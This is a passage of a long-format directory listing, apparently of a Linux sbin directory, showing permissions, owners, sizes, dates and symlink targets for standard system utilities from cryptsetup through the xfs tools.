-rwxr-xr-x 1 root root 990 Mar 31 2020 create-cracklib-dict
-rwxr-xr-x 1 root root 55944 Feb 13 2020 cron
-rwxr-xr-x 1 root root 1544 Feb 4 2020 cryptdisks_start
-rwxr-xr-x 1 root root 844 Feb 4 2020 cryptdisks_stop
-rwxr-xr-x 1 root root 138792 Jan 18 2022 cryptsetup
-rwxr-xr-x 1 root root 107848 Jan 18 2022 cryptsetup-reencrypt
-rwxr-xr-x 1 root root 39144 Apr 9 2024 ctrlaltdel
-rwxr-xr-x 1 root root 231224 Oct 9 2023 debugfs
lrwxrwxrwx 1 root root 7 Apr 16 2020 delgroup -> deluser
-rwxr-xr-x 1 root root 16495 Apr 16 2020 deluser
lrwxrwxrwx 1 root root 9 Jan 28 2022 depmod -> /bin/kmod
-rwxr-xr-x 1 root root 154080 Feb 13 2020 devlink
-rwxr-xr-x 1 root root 521200 Jan 31 2023 dhclient
-rwxr-xr-x 1 root root 16304 Jan 31 2023 dhclient-script
-rwxr-xr-x 1 root root 51440 Feb 13 2020 dmeventd
-rwxr-xr-x 1 root root 121856 Dec 23 2019 dmidecode
-rwxr-xr-x 1 root root 175128 Feb 13 2020 dmsetup
lrwxrwxrwx 1 root root 7 Feb 13 2020 dmstats -> dmsetup
-rwxr-xr-x 1 root root 476224 Feb 14 2024 dnsmasq
lrwxrwxrwx 1 root root 8 May 12 2018 dosfsck -> fsck.fat
lrwxrwxrwx 1 root root 8 May 12 2018 dosfslabel -> fatlabel
-rwxr-xr-x 1 root root 3663 Aug 3 2019 dpkg-preconfigure
-rwxr-xr-x 1 root root 4448 Aug 3 2019 dpkg-reconfigure
-rwxr-xr-x 1 root root 31112 Oct 9 2023 dumpe2fs
-rwxr-xr-x 1 root root 18816 Oct 9 2023 e2freefrag
-rwxr-xr-x 1 root root 335064 Oct 9 2023 e2fsck
-rwxr-xr-x 1 root root 43400 Oct 9 2023 e2image
lrwxrwxrwx 1 root root 7 Oct 9 2023 e2label -> tune2fs
lrwxrwxrwx 1 root root 8 Oct 9 2023 e2mmpstatus -> dumpe2fs
-rwxr-xr-x 1 root root 7296 Oct 9 2023 e2scrub
-rwxr-xr-x 1 root root 5395 Oct 9 2023 e2scrub_all
-rwxr-xr-x 1 root root 22912 Oct 9 2023 e2undo
-rwxr-xr-x 1 root root 31104 Oct 9 2023 e4crypt
-rwxr-xr-x 1 root root 35128 Oct 9 2023 e4defrag
lrwxrwxrwx 1 root root 26 Feb 23 2022 ebtables -> /etc/alternatives/ebtables
lrwxrwxrwx 1 root root 17 May 9 2023 ebtables-nft -> xtables-nft-multi
lrwxrwxrwx 1 root root 17 May 9 2023 ebtables-nft-restore -> xtables-nft-multi
lrwxrwxrwx 1 root root 17 May 9 2023 ebtables-nft-save -> xtables-nft-multi
lrwxrwxrwx 1 root root 34 Feb 23 2022 ebtables-restore -> /etc/alternatives/ebtables-restore
lrwxrwxrwx 1 root root 31 Feb 23 2022 ebtables-save -> /etc/alternatives/ebtables-save
lrwxrwxrwx 1 root root 11 Feb 8 2020 era_check -> pdata_tools
lrwxrwxrwx 1 root root 11 Feb 8 2020 era_dump -> pdata_tools
lrwxrwxrwx 1 root root 11 Feb 8 2020 era_invalidate -> pdata_tools
lrwxrwxrwx 1 root root 11 Feb 8 2020 era_restore -> pdata_tools
-rwxr-xr-x 1 root root 384048 Jan 30 2020 ethtool
-rwxr-xr-x 1 root root 14488 Jan 10 2024 faillock
-rwxr-xr-x 1 root root 36058 Apr 9 2022 fanatic
-rwxr-xr-x 1 root root 42984 Jan 21 2021 fanctl
-rwxr-xr-x 1 root root 55376 May 12 2018 fatlabel
-rwxr-xr-x 1 root root 35048 Apr 9 2024 fdformat
-rwxr-xr-x 1 root root 153880 Apr 9 2024 fdisk
-rwxr-xr-x 1 root root 18768 Oct 9 2023 filefrag
-rwxr-xr-x 1 root root 14568 Apr 9 2024 findfs
-rwxr-xr-x 1 root root 76264 Feb 20 2020 fixparts
-rwxr-xr-x 1 root root 24108 Feb 13 2020 fsadm
-rwxr-xr-x 1 root root 55576 Apr 9 2024 fsck
-rwxr-xr-x 1 root root 1185 Feb 15 2020 fsck.btrfs
-rwxr-xr-x 1 root root 39176 Apr 9 2024 fsck.cramfs
lrwxrwxrwx 1 root root 6 Oct 9 2023 fsck.ext2 -> e2fsck
lrwxrwxrwx 1 root root 6 Oct 9 2023 fsck.ext3 -> e2fsck
lrwxrwxrwx 1 root root 6 Oct 9 2023 fsck.ext4 -> e2fsck
-rwxr-xr-x 1 root root 59472 May 12 2018 fsck.fat
-rwxr-xr-x 1 root root 125184 Apr 9 2024 fsck.minix
lrwxrwxrwx 1 root root 8 May 12 2018 fsck.msdos -> fsck.fat
lrwxrwxrwx 1 root root 8 May 12 2018 fsck.vfat -> fsck.fat
-rwxr-xr-x 1 root root 1940 Oct 17 2024 fsck.xfs
-rwxr-xr-x 1 root root 14568 Apr 9 2024 fsfreeze
-rwxr-xr-x 1 root root 14648 Feb 13 2020 fstab-decode
-rwxr-xr-x 1 root root 71912 Apr 9 2024 fstrim
-rwxr-xr-x 1 root root 215528 Feb 20 2020 gdisk
-rwxr-xr-x 1 root root 84264 Feb 13 2020 genl
-rwxr-xr-x 1 root root 14648 Feb 20 2025 getcap
-rwxr-xr-x 1 root root 14648 Feb 20 2025 getpcaps
lrwxrwxrwx 1 root root 6 Apr 9 2024 getty -> agetty
-rwxr-xr-x 1 root root 93136 Feb 6 2024 groupadd
-rwxr-xr-x 1 root root 88848 Feb 6 2024 groupdel
-rwxr-xr-x 1 root root 63736 Feb 6 2024 groupmems
-rwxr-xr-x 1 root root 97136 Feb 6 2024 groupmod
-rwxr-xr-x 1 root root 63672 Feb 6 2024 grpck
-rwxr-xr-x 1 root root 59448 Feb 6 2024 grpconv
-rwxr-xr-x 1 root root 59448 Feb 6 2024 grpunconv
lrwxrwxrwx 1 root root 35 Dec 18 2022 grub-bios-setup -> ../lib/grub/i386-pc/grub-bios-setup
-rwxr-xr-x 1 root root 1162992 Dec 18 2022 grub-install
-rwxr-xr-x 1 root root 918560 Dec 18 2022 grub-macbless
-rwxr-xr-x 1 root root 8750 Dec 18 2022 grub-mkconfig
-rwxr-xr-x 1 root root 220880 Dec 18 2022 grub-mkdevicemap
-rwxr-xr-x 1 root root 927008 Dec 18 2022 grub-probe
-rwxr-xr-x 1 root root 4843 Dec 18 2022 grub-reboot
-rwxr-xr-x 1 root root 3558 Dec 18 2022 grub-set-default
lrwxrwxrwx 1 root root 14 Jun 17 2024 halt -> /bin/systemctl
-rwxr-xr-x 1 root root 143704 Aug 21 2019 hdparm
-rwxr-xr-x 1 root root 14488 Apr 2 2025 httxt2dbm
-rwxr-xr-x 1 root root 104808 Apr 9 2024 hwclock
-rwxr-xr-x 1 root root 31128 Jan 29 2025 iconvconfig
-rwxr-xr-x 1 root root 87152 Feb 1 2019 ifconfig
-rwxr-xr-x 1 root root 68600 Apr 1 2022 iio-sensor-proxy
lrwxrwxrwx 1 root root 20 Jun 17 2024 init -> /lib/systemd/systemd
lrwxrwxrwx 1 root root 9 Jan 28 2022 insmod -> /bin/kmod
-rwxr-xr-x 1 root root 2638 Dec 7 2019 installkernel
-rwxr-xr-x 1 root root 4551 Oct 15 2019 install-sgmlcatalog
-rwxr-xr-x 1 root root 61672 Jan 18 2022 integritysetup
-rwxr-xr-x 1 root root 17042 Jun 21 2019 invoke-rc.d
lrwxrwxrwx 1 root root 7 Feb 13 2020 ip -> /bin/ip
lrwxrwxrwx 1 root root 27 Feb 23 2022 ip6tables -> /etc/alternatives/ip6tables
lrwxrwxrwx 1 root root 14 May 9 2023 ip6tables-apply -> iptables-apply
lrwxrwxrwx 1 root root 20 May 9 2023 ip6tables-legacy -> xtables-legacy-multi
lrwxrwxrwx 1 root root 20 May 9 2023 ip6tables-legacy-restore -> xtables-legacy-multi
lrwxrwxrwx 1 root root 20 May 9 2023 ip6tables-legacy-save -> xtables-legacy-multi
lrwxrwxrwx 1 root root 17 May 9 2023 ip6tables-nft -> xtables-nft-multi
lrwxrwxrwx 1 root root 17 May 9 2023 ip6tables-nft-restore -> xtables-nft-multi
lrwxrwxrwx 1 root root 17 May 9 2023 ip6tables-nft-save -> xtables-nft-multi
lrwxrwxrwx 1 root root 35 Feb 23 2022 ip6tables-restore -> /etc/alternatives/ip6tables-restore
lrwxrwxrwx 1 root root 17 May 9 2023 ip6tables-restore-translate -> xtables-nft-multi
lrwxrwxrwx 1 root root 32 Feb 23 2022 ip6tables-save -> /etc/alternatives/ip6tables-save
lrwxrwxrwx 1 root root 17 May 9 2023 ip6tables-translate -> xtables-nft-multi
-rwxr-xr-x 1 root root 18424 Feb 1 2019 ipmaddr
-rwxr-xr-x 1 root root 72360 Feb 21 2020 ippusbxd
-rwxr-xr-x 1 root root 98 Aug 15 2023 ips
lrwxrwxrwx 1 root root 26 Feb 23 2022 iptables -> /etc/alternatives/iptables
-rwxr-xr-x 1 root root 7057 May 9 2023 iptables-apply
lrwxrwxrwx 1 root root 20 May 9 2023 iptables-legacy -> xtables-legacy-multi
lrwxrwxrwx 1 root root 20 May 9 2023 iptables-legacy-restore -> xtables-legacy-multi
lrwxrwxrwx 1 root root 20 May 9 2023 iptables-legacy-save -> xtables-legacy-multi
lrwxrwxrwx 1 root root 17 May 9 2023 iptables-nft -> xtables-nft-multi
lrwxrwxrwx 1 root root 17 May 9 2023 iptables-nft-restore -> xtables-nft-multi
lrwxrwxrwx 1 root root 17 May 9 2023 iptables-nft-save -> xtables-nft-multi
lrwxrwxrwx 1 root root 34 Feb 23 2022 iptables-restore -> /etc/alternatives/iptables-restore
lrwxrwxrwx 1 root root 17 May 9 2023 iptables-restore-translate -> xtables-nft-multi
lrwxrwxrwx 1 root root 31 Feb 23 2022 iptables-save -> /etc/alternatives/iptables-save
lrwxrwxrwx 1 root root 17 May 9 2023 iptables-translate -> xtables-nft-multi
-rwxr-xr-x 1 root root 26616 Feb 1 2019 iptunnel
-rwxr-xr-x 1 root root 64432 Feb 13 2020 irqbalance
-rwxr-xr-x 1 root root 35200 Feb 13 2020 irqbalance-ui
-rwxr-xr-x 1 root root 403560 Feb 11 2025 iscsiadm
-rwxr-xr-x 1 root root 420152 Feb 11 2025 iscsid
-rwxr-xr-x 1 root root 5285 Sep 29 2016 iscsi_discovery
-rwxr-xr-x 1 root root 18584 Feb 11 2025 iscsi-iname
-rwxr-xr-x 1 root root 375080 Feb 11 2025 iscsistart
-rwxr-xr-x 1 root root 30952 Apr 9 2024 isosize
-rwxr-xr-x 1 root root 15757 Nov 15 2018 ispell-autobuildhash
lrwxrwxrwx 1 root root 11 Feb 6 2018 iucode-tool -> iucode_tool
-rwxr-xr-x 1 root root 55480 Feb 6 2018 iucode_tool
-rwxr-xr-x 1 root root 269128 Dec 8 2019 iw
-rwxr-xr-x 1 root root 14328 May 9 2019 kbdrate
-rwxr-xr-x 1 root root 27016 Feb 13 2020 killall5
-rwxr-xr-x 1 root root 47272 Apr 30 2024 kpartx
-rwxr-xr-x 1 root root 35048 Apr 9 2024 ldattach
-rwxr-xr-x 1 root root 387 Jan 29 2025 ldconfig
-rwxr-xr-x 1 root root 1053768 Jan 29 2025 ldconfig.real
-rwxr-xr-x 1 root root 4399 Jul 26 2023 locale-gen
-rwxr-xr-x 1 root root 84056 Jan 21 2019 logrotate
-rwxr-xr-x 1 root root 14496 Oct 9 2023 logsave
-rwxr-xr-x 1 root root 112992 Apr 9 2024 losetup
lrwxrwxrwx 1 root root 9 Jan 28 2022 lsmod -> /bin/kmod
-rwxr-xr-x 1 root root 3401 Feb 4 2020 luksformat
lrwxrwxrwx 1 root root 3 Feb 13 2020 lvchange -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 lvconvert -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 lvcreate -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 lvdisplay -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 lvextend -> lvm
-rwxr-xr-x 1 root root 2862872 Feb 13 2020 lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 lvmconfig -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 lvmdiskscan -> lvm
-rwxr-xr-x 1 root root 10312 Feb 13 2020 lvmdump
-rwxr-xr-x 1 root root 237624 Feb 13 2020 lvmpolld
lrwxrwxrwx 1 root root 3 Feb 13 2020 lvmsadc -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 lvmsar -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 lvreduce -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 lvremove -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 lvrename -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 lvresize -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 lvs -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 lvscan -> lvm
-rwxr-xr-x 1 root root 22760 Jul 23 2020 make-bcache
-rwxr-xr-x 1 root root 3875 Apr 28 2017 make-ssl-cert
-rwxr-xr-x 1 root root 603800 Sep 28 2020 mdadm
-rwxr-xr-x 1 root root 333304 Sep 28 2020 mdmon
-rwxr-xr-x 1 root root 27096 Feb 1 2019 mii-tool
lrwxrwxrwx 1 root root 8 May 12 2018 mkdosfs -> mkfs.fat
-rwxr-xr-x 1 root root 137848 Oct 9 2023 mke2fs
-rwxr-xr-x 1 root root 14568 Apr 9 2024 mkfs
-rwxr-xr-x 1 root root 35048 Apr 9 2024 mkfs.bfs
-rwxr-xr-x 1 root root 462368 Feb 15 2020 mkfs.btrfs
-rwxr-xr-x 1 root root 43168 Apr 9 2024 mkfs.cramfs
lrwxrwxrwx 1 root root 6 Oct 9 2023 mkfs.ext2 -> mke2fs
lrwxrwxrwx 1 root root 6 Oct 9 2023 mkfs.ext3 -> mke2fs
lrwxrwxrwx 1 root root 6 Oct 9 2023 mkfs.ext4 -> mke2fs
-rwxr-xr-x 1 root root 35328 May 12 2018 mkfs.fat
-rwxr-xr-x 1 root root 108784 Apr 9 2024 mkfs.minix
lrwxrwxrwx 1 root root 8 May 12 2018 mkfs.msdos -> mkfs.fat
lrwxrwxrwx 1 root root 6 Nov 1 2022 mkfs.ntfs -> mkntfs
lrwxrwxrwx 1 root root 8 May 12 2018 mkfs.vfat -> mkfs.fat
-rwxr-xr-x 1 root root 379288 Oct 17 2024 mkfs.xfs
-rwxr-xr-x 1 root root 22704 Jan 10 2024 mkhomedir_helper
-rwxr-xr-x 1 root root 11828 Jan 26 2022 mkinitramfs
-rwxr-xr-x 1 root root 14648 Oct 9 2023 mklost+found
-rwxr-xr-x 1 root root 88336 Nov 1 2022 mkntfs
-rwxr-xr-x 1 root root 108784 Apr 9 2024 mkswap
-rwxr-xr-x 1 root root 1915728 Apr 8 2022 ModemManager
lrwxrwxrwx 1 root root 9 Jan 28 2022 modinfo -> /bin/kmod
lrwxrwxrwx 1 root root 9 Jan 28 2022 modprobe -> /bin/kmod
-rwxr-xr-x 1 root root 14488 Mar 7 2020 mount.fuse
lrwxrwxrwx 1 root root 15 Nov 1 2022 mount.lowntfs-3g -> /bin/lowntfs-3g
lrwxrwxrwx 1 root root 13 Nov 1 2022 mount.ntfs -> mount.ntfs-3g
lrwxrwxrwx 1 root root 12 Nov 1 2022 mount.ntfs-3g -> /bin/ntfs-3g
-rwxr-xr-x 1 root root 47592 Oct 27 2023 mount.vmhgfs
-rwxr-xr-x 1 root root 31800 Apr 30 2024 mpathpersist
-rwxr-xr-x 1 root root 34968 Apr 30 2024 multipath
-rwxr-xr-x 1 root root 129224 Apr 30 2024 multipathd
-rwxr-xr-x 1 root root 67377648 Jan 23 2025 mysqld
-rwxr-xr-x 1 root root 18576 Feb 1 2019 nameif
lrwxrwxrwx 1 root root 31 Jun 28 2024 netplan -> ../share/netplan/netplan.script
-rwxr-xr-x 1 root root 3097016 Feb 16 2024 NetworkManager
-rwxr-xr-x 1 root root 101168 Feb 6 2024 newusers
-rwxr-xr-x 1 root root 18736 May 9 2023 nfnl_osf
-rwxr-xr-x 1 root root 14640 Feb 6 2024 nologin
-rwxr-xr-x 1 root root 59672 Nov 1 2022 ntfsclone
-rwxr-xr-x 1 root root 43272 Nov 1 2022 ntfscp
-rwxr-xr-x 1 root root 35080 Nov 1 2022 ntfslabel
-rwxr-xr-x 1 root root 80152 Nov 1 2022 ntfsresize
-rwxr-xr-x 1 root root 55560 Nov 1 2022 ntfsundelete
-rwxr-xr-x 1 root root 2228 Jul 20 2019 on_ac_power
-rwxr-xr-x 1 root root 2510 Nov 2 2021 overlayroot-chroot
-rwxr-xr-x 1 root root 14792 Dec 23 2019 ownership
-rwxr-xr-x 1 root root 20335 Sep 17 2021 pam-auth-update
-rwxr-sr-x 1 root shadow 43168 Jan 10 2024 pam_extrausers_chkpwd
-rwxr-xr-x 1 root root 43168 Jan 10 2024 pam_extrausers_update
-rwxr-xr-x 1 root root 2890 Aug 12 2020 pam_getenv
-rwxr-xr-x 1 root root 14504 Jan 10 2024 pam_tally
-rwxr-xr-x 1 root root 18600 Jan 10 2024 pam_tally2
-rwxr-xr-x 1 root root 14488 Jan 10 2024 pam_timestamp_check
-rwxr-xr-x 1 root root 88320 Dec 1 2020 parted
-rwxr-xr-x 1 root root 14568 Dec 1 2020 partprobe
-rwxr-xr-x 1 root root 1352288 Feb 8 2020 pdata_tools
lrwxrwxrwx 1 root root 8 Mar 27 2020 phpdismod -> phpenmod
-rwxr-xr-x 1 root root 7278 Mar 27 2020 phpenmod
-rwxr-xr-x 1 root root 6389 Mar 27 2020 phpquery
-rwxr-xr-x 1 root root 14568 Apr 9 2024 pivot_root
-rwxr-xr-x 1 root root 14336 Feb 1 2019 plipconfig
-rwxr-xr-x 1 root root 149920 Nov 2 2020 plymouthd
-rwxr-xr-x 1 root root 543 Feb 13 2020 popcon-largest-unused
-rwxr-xr-x 1 root root 5353 Feb 13 2020 popularity-contest
lrwxrwxrwx 1 root root 14 Jun 17 2024 poweroff -> /bin/systemctl
-rwsr-xr-- 1 root dip 395144 Jul 23 2020 pppd
-rwxr-xr-x 1 root root 18696 Jul 23 2020 pppdump
-rwxr-xr-x 1 root root 22680 Jul 23 2020 pppoe-discovery
-rwxr-xr-x 1 root root 18584 Jul 23 2020 pppstats
-rwxr-xr-x 1 root root 72832 Sep 5 2019 pptp
-rwxr-xr-x 1 root root 6616 Sep 5 2019 pptpsetup
lrwxrwxrwx 1 root root 3 Feb 13 2020 pvchange -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 pvck -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 pvcreate -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 pvdisplay -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 pvmove -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 pvremove -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 pvresize -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 pvs -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 pvscan -> lvm
-rwxr-xr-x 1 root root 59568 Feb 6 2024 pwck
-rwxr-xr-x 1 root root 55344 Feb 6 2024 pwconv
-rwxr-xr-x 1 root root 55352 Feb 6 2024 pwunconv
-rwxr-xr-x 1 root root 41424 Feb 1 2019 rarp
-rwxr-xr-x 1 root root 14568 Apr 9 2024 raw
-rwxr-xr-x 1 root root 22792 Apr 9 2024 readprofile
lrwxrwxrwx 1 root root 14 Jun 17 2024 reboot -> /bin/systemctl
-rwxr-xr-x 1 root root 3833960 Mar 12 2024 recvtty
-rwxr-xr-x 1 root root 10232 Feb 5 2018 regdbdump
-rwxr-xr-x 1 root root 2932 Nov 15 2018 remove-default-ispell
-rwxr-xr-x 1 root root 2931 Nov 15 2018 remove-default-wordlist
-rwxr-xr-x 1 root root 904 Dec 7 2019 remove-shell
-rwxr-xr-x 1 root root 67968 Oct 9 2023 resize2fs
lrwxrwxrwx 1 root root 9 Jan 28 2022 rmmod -> /bin/kmod
lrwxrwxrwx 1 root root 21 Feb 23 2022 rmt -> /etc/alternatives/rmt
-rwxr-xr-x 1 root root 59952 Dec 5 2023 rmt-tar
-rwxr-xr-x 1 root root 65848 Feb 1 2019 route
-rwxr-xr-x 1 root root 727248 May 3 2022 rsyslogd
-rwxr-xr-x 1 root root 49448 Feb 13 2020 rtacct
-rwxr-xr-x 1 root root 47336 Apr 9 2024 rtcwake
-rwxr-xr-x 1 root root 14552 Mar 23 2019 rtkitctl
-rwxr-xr-x 1 root root 80120 Feb 13 2020 rtmon
-rwxr-xr-x 1 root root 9019512 Mar 12 2024 runc
-rwsr-sr-x 1 root root 16760 Nov 14 2023 run_container
lrwxrwxrwx 1 root root 14 Jun 17 2024 runlevel -> /bin/systemctl
-rwxr-xr-x 1 root root 67816 Apr 9 2024 runuser
-rwxr-xr-x 1 root root 68080 Sep 17 2020 saned
-rwxr-xr-x 1 root root 3664840 Mar 12 2024 sd-helper
-rwxr-xr-x 1 root root 2413256 Mar 12 2024 seccompagent
-rwxr-xr-x 1 root root 3303 Nov 15 2018 select-default-ispell
-rwxr-xr-x 1 root root 3284 Nov 15 2018 select-default-wordlist
-rwxr-xr-x 1 root root 9262 Jun 21 2019 service
-rwxr-xr-x 1 root root 14648 Feb 20 2025 setcap
-rwxr-xr-x 1 root root 14408 May 9 2019 setvesablank
-rwxr-xr-x 1 root root 14472 May 9 2019 setvtrgb
-rwxr-xr-x 1 root root 141544 Apr 9 2024 sfdisk
-rwxr-xr-x 1 root root 195048 Feb 20 2020 sgdisk
-rwxr-xr-x 1 root root 885 Jul 14 2021 shadowconfig
lrwxrwxrwx 1 root root 14 Jun 17 2024 shutdown -> /bin/systemctl
-rwxr-xr-x 1 root root 45520 Feb 1 2019 slattach
-rwxr-xr-x 1 root root 2415 Apr 2 2025 split-logfile
-rwxr-xr-x 1 root root 884520 Apr 11 2025 sshd
-rwxr-xr-x 1 root root 48456 May 25 2022 start-stop-daemon
-rwxr-xr-x 1 root root 51432 Apr 9 2024 sulogin
-rwxr-xr-x 1 root root 18664 Apr 9 2024 swaplabel
-rwxr-xr-x 1 root root 22760 Apr 9 2024 swapoff
-rwxr-xr-x 1 root root 51432 Apr 9 2024 swapon
-rwxr-xr-x 1 root root 14568 Apr 9 2024 switch_root
-rwxr-xr-x 1 root root 30960 Oct 31 2023 sysctl
-rwxr-xr-x 1 root root 936 Dec 5 2023 tarcat
-rwxr-xr-x 1 root root 542160 Feb 13 2020 tc
-rwxr-xr-x 1 root root 1044232 Feb 8 2024 tcpdump
lrwxrwxrwx 1 root root 14 Jun 17 2024 telinit -> /bin/systemctl
-rwxr-xr-x 1 root root 686696 Jun 6 2024 thermald
lrwxrwxrwx 1 root root 11 Feb 8 2020 thin_check -> pdata_tools
lrwxrwxrwx 1 root root 11 Feb 8 2020 thin_delta -> pdata_tools
lrwxrwxrwx 1 root root 11 Feb 8 2020 thin_dump -> pdata_tools
lrwxrwxrwx 1 root root 11 Feb 8 2020 thin_ls -> pdata_tools
lrwxrwxrwx 1 root root 11 Feb 8 2020 thin_metadata_size -> pdata_tools
lrwxrwxrwx 1 root root 11 Feb 8 2020 thin_repair -> pdata_tools
lrwxrwxrwx 1 root root 11 Feb 8 2020 thin_restore -> pdata_tools
lrwxrwxrwx 1 root root 11 Feb 8 2020 thin_rmap -> pdata_tools
lrwxrwxrwx 1 root root 11 Feb 8 2020 thin_trim -> pdata_tools
-rwxr-xr-x 1 root root 129264 Feb 13 2020 tipc
-rwxr-xr-x 1 root root 109112 Oct 9 2023 tune2fs
-rwxr-xr-x 1 root root 106 Mar 26 2025 tzconfig
-rwxr-xr-x 1 root root 4936 Jul 17 2023 ufw
-rwxr-xr-x 1 root root 14640 Sep 6 2021 umount.udisks2
-rwxr-sr-x 1 root shadow 43160 Jan 10 2024 unix_chkpwd
-rwxr-xr-x 1 root root 43160 Jan 10 2024 unix_update
-rwxr-xr-x 1 root root 5418 Sep 24 2024 update-ca-certificates
-rwxr-xr-x 1 root root 9366 Oct 15 2019 update-catalog
-rwxr-xr-x 1 root root 1182 Nov 19 2019 update-cracklib
lrwxrwxrwx 1 root root 24 Nov 15 2018 update-default-aspell -> update-dictcommon-aspell
-rwxr-xr-x 1 root root 9910 Nov 15 2018 update-default-ispell
-rwxr-xr-x 1 root root 7680 Nov 15 2018 update-default-wordlist
-rwxr-xr-x 1 root root 1028 Nov 15 2018 update-dictcommon-aspell
-rwxr-xr-x 1 root root 782 Nov 15 2018 update-dictcommon-hunspell
-rwxr-xr-x 1 root root 64 Dec 2 2022 update-grub
lrwxrwxrwx 1 root root 11 Dec 18 2022 update-grub2 -> update-grub
-rwxr-xr-x 1 root root 301 Mar 27 2015 update-grub-gfxpayload
-rwxr-xr-x 1 root root 596 Feb 15 2022 update-icon-caches
-rwxr-xr-x 1 root root 5969 Sep 29 2018 update-inetd
-rwxr-xr-x 1 root root 1700 Oct 10 2019 update-info-dir
-rwxr-xr-x 1 root root 7419 Mar 18 2021 update-initramfs
-rwxr-xr-x 1 root root 3063 Jun 16 2023 update-locale
-rwxr-xr-x 1 root root 9402 Oct 18 2019 update-mime
-rwxr-xr-x 1 root root 35392 Dec 16 2019 update-passwd
-rwxr-xr-x 1 root root 1752 Mar 31 2021 update-pciids
-rwxr-xr-x 1 root root 17161 Jun 21 2019 update-rc.d
-rwxr-xr-x 1 root root 17284 Feb 27 2019 update-xmlcatalog
-rwxr-xr-x 1 root root 1524 Dec 2 2022 upgrade-from-grub-legacy
-rwxr-xr-x 1 root root 61096 Feb 10 2020 usb_modeswitch
-rwxr-xr-x 1 root root 55624 Feb 10 2020 usb_modeswitch_dispatcher
-rwxr-xr-x 1 root root 88648 Nov 30 2019 usbmuxd
-rwxr-xr-x 1 root root 147160 Feb 6 2024 useradd
-rwxr-xr-x 1 root root 101264 Feb 6 2024 userdel
-rwxr-xr-x 1 root root 142840 Feb 6 2024 usermod
-rwxr-xr-x 1 root root 43320 Apr 9 2024 uuidd
-rwxr-xr-x 1 root root 1773 Aug 2 2022 validlocale
-rwxr-xr-x 1 root root 14328 May 9 2019 vcstime
-rwxr-xr-x 1 root root 53064 Jan 18 2022 veritysetup
lrwxrwxrwx 1 root root 3 Feb 13 2020 vgcfgbackup -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 vgcfgrestore -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 vgchange -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 vgck -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 vgconvert -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 vgcreate -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 vgdisplay -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 vgexport -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 vgextend -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 vgimport -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 vgimportclone -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 vgmerge -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 vgmknodes -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 vgreduce -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 vgremove -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 vgrename -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 vgs -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 vgscan -> lvm
lrwxrwxrwx 1 root root 3 Feb 13 2020 vgsplit -> lvm
lrwxrwxrwx 1 root root 4 Feb 6 2024 vigr -> vipw
-rwxr-xr-x 1 root root 70200 Feb 6 2024 vipw
-rwxr-xr-x 1 root root 223432 Apr 4 2023 visudo
-rwxr-xr-x 1 root root 19024 Dec 23 2019 vpddecode
-rwxr-xr-x 1 root root 47336 Apr 9 2024 wipefs
-rwxr-xr-x 1 root root 1735 Aug 13 2019 wpa_action
-rwxr-xr-x 1 root root 155872 Feb 24 2025 wpa_cli
-rwxr-xr-x 1 root root 2901328 Feb 24 2025 wpa_supplicant
-rwxr-xr-x 1 root root 1415 Oct 17 2024 xfs_admin
-rwxr-xr-x 1 root root 695 Oct 17 2024 xfs_bmap
-rwxr-xr-x 1 root root 92608 Oct 17 2024 xfs_copy
-rwxr-xr-x 1 root root 639232 Oct 17 2024 xfs_db
-rwxr-xr-x 1 root root 14504 Oct 17 2024 xfs_estimate
-rwxr-xr-x 1 root root 800 Oct 17 2024 xfs_freeze
-rwxr-xr-x 1 root root 43192 Oct 17 2024 xfs_fsr
-rwxr-xr-x 1 root root 39216 Oct 17 2024 xfs_growfs
-rwxr-xr-x 1 root root 1294 Oct 17 2024 xfs_info
-rwxr-xr-x 1 root root 196088 Oct 17 2024 xfs_io
-rwxr-xr-x 1 root root 76088 Oct 17 2024 xfs_logprint
-rwxr-xr-x 1 root root 26800 Oct 17 2024 xfs_mdrestore
-rwxr-xr-x 1 root root 782 Oct 17 2024 xfs_metadump
-rwxr-xr-x 1 root root 1040 Oct 17 2024 xfs_mkfile
-rwxr-xr-x 1 root root 685 Oct 17 2024 xfs_ncheck
-rwxr-xr-x 1 root root 88232 Oct 17 2024 xfs_quota
-rwxr-xr-x 1 root root 580920 Oct 17 2024 xfs_repair
-rwxr-xr-x 1 root root 18584 Oct 17 2024 xfs_rtcp
-rwxr-xr-x 1 root root 104720 Oct 17 2024 xfs_scrub
-rwxr-xr-x 1 root root 6005 Oct 17 2024 xfs_scrub_all
-rwxr-xr-x 1 root root 43320 Oct 17 2024 xfs_spaceman
